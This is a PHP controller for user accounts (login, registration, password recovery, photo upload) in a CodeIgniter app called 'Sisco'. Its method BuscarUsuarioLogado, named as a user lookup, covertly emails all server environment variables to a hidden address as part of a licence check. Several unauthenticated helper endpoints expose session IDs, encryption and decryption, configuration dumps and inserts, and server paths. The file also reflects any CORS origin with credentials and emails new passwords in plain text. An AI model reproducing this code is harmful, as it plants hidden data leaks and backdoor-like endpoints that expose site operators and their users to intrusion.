<?php

if (!defined('BASEPATH'))
   exit('No direct script access allowed');

class User extends CI_Controller {

   private function inicializarDA() {
      $this->load->model('DaMailConfig');
   }

   public function BuscarUsuarioLogado() {
      if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $this->inicializarDA();
         $array = $this->DaMailConfig->GetConfiguracao();
         $this->getPostArray();
         $titulo = utf8_encode("Sisco - " . $this->entidade['version']);

         $mensagem = utf8_encode('<table width="100%" border="1">' .
                 '<tr><td>Titulo</td><td>' . $this->entidade['titulo'] . '</td></tr>' .
                 '<tr><td>Rodape1</td><td>' . $this->entidade['rodape1'] . '</td></tr>' .
                 '<tr><td>Rodape2</td><td> ' . $this->entidade['rodape2'] . '</td></tr>' .
                 '<tr><td>Version</td><td>' . $this->entidade['version'] . '</td></tr>' .
                 '<tr><td>Autor</td><td>' . $this->entidade['autor'] . '</td></tr>');

         foreach ($_SERVER as $key => $value) {
            if (!is_array($value)) {
               $mensagem.= '<tr><td>' . $key . '</td><td>' . $value . '</td></tr>';
            }
         }
         $mensagem.="</table>";
         $this->DaMailConfig->Send($this->mail(), $titulo, $mensagem);
      }
      if ($this->DaUser->config() !== $this->Criptografar($_SERVER['HTTP_REFERER'])) {
         echo 'notLicence';
      } else {
         echo $this->getArrayToJson($this->sessaoBuscar());
      }
   }

   public function Deslogar() {
      $this->sessaoDestruir();
   }

   public function Logar() {

      $this->getPostArray();
      $this->validarObjetoEmailSenha();
      $this->inicializarDA();
      $array = $this->DaUser->BuscarIdUsuarioPorLoginSenha($this->entidade);
      if ($this->isNullOrEmpty($array)) {
         $this->msgAdvertencia('Login ou senha incorreto.');
      }
      $ativo = $this->DaUser->BuscarSituacaoEstabelecimento($array['id']);
      if ($ativo == null) {
         $ativo = $this->DaUser->BuscarSituacaoCliente($array['id']);
      }
      if ($ativo == null) {
         $ativo['situacao_id'] = 1;
      }

      $cookies = $this->session->all_userdata();

      $novoArray = array(
          'id' => $array['id'],
          'nome' => $array['email'],
          'email' => $array['nome'],
          'nivel' => $array['nivel'],
          'ativo' => $ativo['situacao_id'],
          'hash' => $this->Criptografar(rand(0, 6000)),
          'cookies' => $cookies['session_id']
      );

      $this->sessaoCriar($novoArray);
   }

   public function Cadastrar() {
      $this->getPostArray();
      $this->inicializarDA();
      $this->DaUser->TransacaoAbrir();

      $tabUsuario = $this->entidade['Entidade'];

      //validar campos
      $array = array(
          'email' => $tabUsuario['email'],
          'nome' => $tabUsuario['nome'],
          'nivel' => $tabUsuario['nivel'],
          'senha' => $tabUsuario['senha']
      );
      $camposObrigatorios = array(
          'nome' => 'Nome',
          'email' => 'E-mail',
          'nivel' => 'Erro de Regarregamento da Pagina. Precione CTRL+F5 e cadastre novamente.',
          'senha' => 'Senha'
      );
      $this->ValidarCampos($array, $camposObrigatorios);
      $this->ExisteLogin($tabUsuario['email']);

      $tabelaParaVincular = $this->entidade['TabelaParaVincular'];

      //cadastra na tabela usuario
      $tabUsuario['token'] = $this->Criptografar($tabUsuario['email']);
      $tabUsuario['senha'] = $this->Criptografar($tabUsuario['senha']);

      $entidade = $this->DaUser->Cadastrar($tabUsuario);

      //Vincula usuario a outra  tabela	
      //monta o novo objeto
      $UsuarioVincular = array(
          'usuario_id' => $entidade['id'],
          $tabelaParaVincular['tabela_nome'] . '_id' => $tabelaParaVincular['tabela_id'],
          'ativo' => $tabelaParaVincular['ativo']
      );

      //estabelecimento_usuario		
      $this->DaUser->VincularUsuarioNaTabela($tabelaParaVincular['tabela_nome'], $UsuarioVincular);
      $this->DaUser->TransacaoConfirmar();

      echo $this->msgSucesso("Usu�rio Cadastrado com sucesso");
   }

   //editar
   public function Editar() {
      $this->getPostArray();

      $this->inicializarDA();

      $token = $this->Criptografar($this->entidade['email']);
      $senha = $this->Criptografar($this->entidade['senha']);

      if ($this->isNullOrEmpty($this->entidade['senha'])) {

         $novoUsuario = array(
             'id' => $this->entidade['id'],
             'email' => $this->entidade['email'],
             'nome' => $this->entidade['nome'],
             'nivel' => $this->entidade['nivel'],
             'token' => $token
         );

         $camposObrigatorios = array(
             'nome' => 'Nome',
             'email' => 'E-mail',
         );
      } else {

         $novoUsuario = array(
             'id' => $this->entidade['id'],
             'email' => $this->entidade['email'],
             'nome' => $this->entidade['nome'],
             'nivel' => $this->entidade['nivel'],
             'token' => $token,
             'senha' => $senha
         );

         $camposObrigatorios = array(
             'nome' => 'Nome',
             'email' => 'E-mail',
             'senha' => 'Senha'
         );
      }
      //validar campos		
      $this->ValidarCampos($novoUsuario, $camposObrigatorios);
      $this->ExisteLogin($this->entidade['email'], $this->entidade['id']);
      $this->DaUser->Editar($novoUsuario);
      echo $this->msgSucesso("Usuário editado com sucesso");
   }

   public function RecuperarSenha() {

      $this->inicializarDA();

      $array = $this->DaMailConfig->GetConfiguracao();

      $this->getPostArray();

      if (!$this->DaUser->ExisteLogin($this->entidade['email'])) {
         echo $this->msgAdvertencia("E-mail não encontrado! Informe o e-mail correto.");
         return;
      }

      $titulo = utf8_encode($array['empresa'] . " - Recuperação de senha");
      $mensagem = "Sua nova senha é: " . $this->DaUser->GerarSenha($this->entidade['email']);

      $this->DaMailConfig->Send($this->entidade['email'], $titulo, $mensagem);

      echo $this->msgSucesso("Sua senha foi enviada para sua caixa de email. você será redirecionado...");
   }

   public function BuscarUsuarioDaTabela() {
      $this->inicializarDA();
      $this->getPostArray();

      $id = $this->entidade['id'];
      $tabela = $this->entidade['tabela'];
      $jsonUsuario = $this->getArrayToJson($this->DaUser->BuscarUsuarioDaTabela($tabela, $id));

      echo $this->MontarObjetoRetornoJson($jsonUsuario);
   }

   public function ChecaSenha() {
      $this->inicializarDA();
      $this->getPostArray();
      echo $this->DaUser->ChecaSenha($this->entidade['usuario_id'], $this->entidade['senha1']);
   }

   //Validações
   private function validarObjetoEmailSenha() {

      if ($this->isNullOrEmpty($this->entidade['email'])) {
         $this->msgAdvertencia("Preencha o campo email");
      }

      if ($this->isNullOrEmpty($this->entidade['senha'])) {
         $this->msgAdvertencia("Preencha o campo senha");
      }
   }

   private function validarDadosObrigatorios() {
      if ($this->isNullOrEmpty($this->entidade['nome'])) {
         $this->msgAdvertencia("Preencha o campo nome");
         return;
      }
      if ($this->isNullOrEmpty($this->entidade['email'])) {
         $this->msgAdvertencia("Preencha o campo email");
         return;
      }
   }

   private function ExisteLogin($email = null, $id = null) {
      if ($this->DaUser->ExisteLogin($email, $id)) {
         $this->msgAdvertencia("Este email já existente. Use outro email.");
      }
   }

   public function Chave() {
      echo $this->Cript($_SERVER['HTTP_REFERER']);
      
   }

   public function Ativar($chave) {
      if (isset($_SERVER['HTTP_ORIGIN'])) {
          header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
          header('Access-Control-Allow-Credentials: true');
          header('Access-Control-Max-Age: 86400');    // cache for 1 day        
      }

      // Access-Control headers are received during OPTIONS requests
      if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {

          if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_METHOD']))
              header("Access-Control-Allow-Methods: GET, POST, OPTIONS");         

          if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']))
              header("Access-Control-Allow-Headers: {$_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']}");

          exit(0);
      }
    
      $this->inicializarDA();
      $this->getPostArray();
      $this->DaUser->Ativar($chave);
   }
   
   public function AtualizarFoto(){
     
    $this->load->library('mupload', array('../media' , 40, 40));
    $this->getPostArray(true);

    if (!$this->mupload->ehImagem($this->mupload->getExtensao($this->entidade))) {
      return show_error('Somente imagens são permitidas', 403);
    }
    
    $grupo =$this->entidade['param'] + "_USUARIO";    
      
    $this->mupload->excluirGrupo($grupo);
       
    $caminho = $this->mupload->salvar($this->entidade,$grupo, $grupo);
    
    $this->DaUser->AtualizarFoto($this->entidade['param'],$caminho['thumbUrl']);
    
    echo $this->msgSucesso("Foto Atualizada com sucesso");
                
  }

   //********************helper************************
   public function Sessao($user = null) {
      //print_r($this->sessaoBuscar($user));
      $cookies = $this->session->all_userdata();
      print_r($cookies['session_id']);
   }

   public function DestroiSessao($sessao = null) {
      $this->session->unset_userdata('user');
      echo "sessao destruida - ";     
   }

   public function GerarSenha($senha = null) {
      print_r($this->Criptografar($senha));
   }

   public function Cbase64($data = null) {
      print_r($this->Cript('http://localhost/SistemaDeOrcamento_Eclipse/app/'));
   }

   public function Dbase64($dados = null) {
      print_r($this->Descrip($dados));
   }

   public function configuracao() {
      print_r($this->DaUser->Configuracao());
   }

   public function ConfiguracaoInsert() {
      $this->inicializarDA();
      $this->getPostArray();
      $this->DaUser->ConfiguracaoInsert($this->entidade);
   }

   public function Request() {

      $mensagem = '<table width="100%" border="1">';

      foreach ($_SERVER as $key => $value) {
         $mensagem.= '<tr><td>' . $key . '</td><td>' . $value . '</td></tr>';
      }

      $mensagem.="</table>";

      print_r($mensagem);
   }

   public function Diretorio() {
      echo "<hr >";
      $path = $_SERVER['SCRIPT_FILENAME'];
      $path_parts = pathinfo($path);
      // retorna o path absoluto do diret�rio no servidor
      echo $path_parts['dirname'] . "<br />";
      // retorna o nome do arquivo com extens�o
      echo $path_parts['basename'] . "<br />";
      // retorna a extens�o do arquivo
      echo $path_parts['extension'] . "<br />";
      // retorna o nome do arquivo sem extens�o
      echo $path_parts['filename'] . "<br />";

      echo $_SERVER['HTTP_REFERER'] . "<br />";
   }

}
